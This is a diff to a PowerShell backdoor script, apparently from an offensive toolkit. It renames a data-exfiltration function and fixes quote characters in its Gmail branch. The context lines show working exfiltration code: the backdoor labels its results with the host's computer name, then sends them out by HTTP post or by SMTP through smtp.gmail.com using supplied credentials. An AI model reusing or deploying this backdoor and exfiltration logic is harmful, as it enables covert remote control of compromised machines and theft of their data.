@@ -186,7 +186,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
         if ($exfil -eq $True)
         {
            $pastename = $env:COMPUTERNAME + " Results of HTTP Backdoor: "
-           Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
+           Do-Exfiltration-HTTP "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$AuthNS"
         }
         if ($exec -eq 1)
         {
@@ -203,7 +203,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
 
 
 $exfiltration = @'
-function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
+function Do-Exfiltration-HTTP($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
 {
     function post_http($url,$parameters) 
     { 
@@ -240,13 +240,13 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     elseif ($exfiloption -eq "gmail")
     {
         #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-        $smtpserver = “smtp.gmail.com”
+        $smtpserver = "smtp.gmail.com"
         $msg = new-object Net.Mail.MailMessage
         $smtp = new-object Net.Mail.SmtpClient($smtpServer )
         $smtp.EnableSsl = $True
-        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-        $msg.From = “$username@gmail.com”
-        $msg.To.Add(”$username@gmail.com”)
+        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+        $msg.From = "$username@gmail.com"
+        $msg.To.Add("$username@gmail.com")
         $msg.Subject = $pastename
         $msg.Body = $pastevalue
         if ($filename)
